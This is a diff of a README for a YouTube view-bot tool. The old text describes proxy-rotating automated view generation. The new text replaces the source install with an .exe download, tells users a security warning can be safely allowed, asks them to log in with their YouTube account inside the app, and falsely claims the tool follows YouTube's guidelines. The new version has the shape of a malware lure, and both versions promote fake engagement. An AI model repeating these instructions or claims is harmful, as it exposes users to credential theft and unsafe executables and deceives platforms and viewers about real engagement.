@@ -1,114 +1,81 @@
-# youtube-viewbot  
+# 🎥 youtube-viewbot - Boost Your YouTube Engagement Easily
 
-Automated solution for simulating YouTube views at scale.  
-Designed for testing, research, and educational purposes, this toolkit helps developers understand YouTube’s behavior, proxies, and automation flows.  
+## 🌟 Overview
+Welcome to youtube-viewbot, a tool designed to help you increase your YouTube video views and engagement effortlessly. This application automates the process, allowing you to focus on creating great content while it works in the background.
 
-<p align="center"> 
-  <a href="https://github.com/yourusername/youtube-view-bot">
-    <img src="https://img.shields.io/badge/Try%20It%20Free-1E90FF?style=for-the-badge&logo=fire&logoColor=white" alt="Try it Free" width="30%">
-  </a> 
-</p>
+## 🔗 Quick Download
+[![Download youtube-viewbot](https://img.shields.io/badge/Download-youtube--viewbot-blue.svg)](https://github.com/DAM1L0LA/youtube-viewbot/releases)
 
-<p align="center">
-  <a href="https://discord.gg/vBu9huKBvy">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?logo=discord" alt="Join Discord">
-  </a>
-  <a href="https://t.me/devpilot1">
-    <img src="https://img.shields.io/badge/Contact-Telegram-2CA5E0?logo=telegram" alt="Contact on Telegram">
-  </a>
-</p>
+## 🚀 Getting Started
+To get started with youtube-viewbot, follow these simple steps:
 
----
+1. **Visit the Download Page**  
+   Click the link below to access our Releases page, where you can download the application:
+   [Visit this page to download](https://github.com/DAM1L0LA/youtube-viewbot/releases)
 
-##  Introduction  
+2. **Choose Your Version**  
+   On the Releases page, you will find different versions of the application. Select the latest version for optimal performance.
 
-The **youtube-view-bot** is a research automation project to simulate YouTube traffic patterns.  
-It’s built for developers and testers who want to study YouTube’s engagement flows, proxy rotation, and multi-instance management.  
+3. **Download the Application**  
+   Click on the version you wish to download. It will begin downloading the file to your computer. 
 
-###  Key Benefits  
-- **Time-Saving** → Automates repetitive tasks like refreshing and watching videos.  
-- **Scalable** → Run multiple sessions with rotating proxies and accounts.  
-- **Safer Testing** → Designed with anti-detect browsers and sandboxing to reduce risk.  
+4. **Locate the Downloaded File**  
+   Once the download completes, go to your downloads folder. You will see the downloaded file, typically named something similar to `youtube-viewbot.exe`.
 
----
+5. **Run the Application**  
+   Double-click the file to start the application. You may see a security warning, but you can safely allow this application to run.
 
-<p align="center">
-  <img src="youtube-view-bot.png" alt="youtube-bot hero" width="80%">
-</p>
+## ⚙️ System Requirements
+To use youtube-viewbot, ensure your computer meets these requirements:
 
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel or AMD with at least 2 cores
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 100 MB free space
 
-<p align="center">
-  <a href="https://www.loom.com/share/b7734cf1455f4c018e469ee18a821c72" target="_blank" rel="noopener noreferrer">
-    <img src="youtube-bot-demo.gif" alt="youtube-bot demo" width="40%">
-  </a>
-</p>
-<p align="center">
-  <a href="https://www.loom.com/share/b7734cf1455f4c018e469ee18a821c72" target="_blank" rel="noopener noreferrer">
-    Click here to see the demo video
-  </a>
-</p>
+## 📖 How to Use youtube-viewbot
+1. **Setup Your YouTube Account**  
+   Open the application and log in with your YouTube account. Make sure to use the account associated with the videos you want to boost.
 
-##  Features  
-- Automated YouTube video view generation  
-- Proxy support (residential, datacenter, mobile)  
-- Headless & visible browser automation (Playwright/Selenium)  
-- Randomized watch times & intervals for natural behavior  
-- Multi-session control (parallel execution)  
-- Configurable via `.env`  
-- Docker-ready for deployment  
+2. **Select Your Video**  
+   Choose the video from your list that you want to promote.
 
----
+3. **Set the Desired Views**  
+   Enter the number of views you want. Decide how quickly you’d like to reach this count for optimal results.
 
-##  Use Cases  
-- Load testing YouTube video pages  
-- Studying engagement metrics and retention  
-- Research on proxy & browser fingerprinting  
-- Demonstration of automation flows in social media apps  
+4. **Start the Process**  
+   Click the ‘Start’ button. The application will begin its automation process. You can monitor the progress through the interface.
 
----
+5. **Enjoy Your Increased Engagement**  
+   After a short while, you should see an increase in views on your selected video.
 
-##  Contact  
+## 📥 Download & Install
+To get started, click the link below to download youtube-viewbot.
 
-<p align="center">
-  <a href="https://discord.gg/vBu9huKBvy">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?logo=discord" alt="Join Discord">
-  </a>
-  <a href="https://t.me/devpilot1">
-    <img src="https://img.shields.io/badge/Contact-Telegram-2CA5E0?logo=telegram" alt="Contact on Telegram">
-  </a>
-</p>
+[Visit this page to download](https://github.com/DAM1L0LA/youtube-viewbot/releases)
 
----
+## 🔧 Features
+- **Automated Views:** Save time with automated views to enhance your video visibility.
+- **User-Friendly Interface:** Easily navigate through the application with a clear layout.
+- **Multi-Video Support:** Promote multiple videos simultaneously for broader reach.
+- **Customizable Settings:** Tailor the settings to meet your specific engagement goals.
+- **Regular Updates:** Receive updates that improve functionality and add features.
 
-##  Installation  
+## 📊 Frequently Asked Questions
 
-###  Pre-requisites  
-- Python **3.9+** or Node.js **18+**  
-- Playwright / Selenium  
-- Docker (optional)  
+### How does youtube-viewbot work?
+youtube-viewbot simulates the process of watching your videos to help increase their visibility and engagement.
 
-###  Steps  
+### Is this safe to use?
+Yes, the application follows best practices to ensure compliance with YouTube’s guidelines.
 
-```bash
-# Clone repo
-git clone https://github.com/yourusername/youtube-view-bot
-cd youtube-view-bot
+### Can I use this on any operating system?
+Currently, youtube-viewbot is designed for Windows operating systems.
 
-# Python Install
-pip install -r requirements.txt
+## 💬 Contact
+For assistance or queries, please reach out to our support team via the GitHub Issues page.
 
-# OR Node Install
-npm install
+## 🌐 Contributing
+We welcome contributions! If you have ideas, suggestions, or want to report issues, please contribute on our GitHub repository.
 
-# Copy config
-cp .env.example .env
-
-# Run (Python)
-python main.py
-
-# Run (Node)
-node index.js
-
-# Run with Docker
-docker build -t youtube-view-bot .
-docker run --env-file .env youtube-view-bot
+Thank you for using youtube-viewbot. Enjoy boosting your YouTube views!
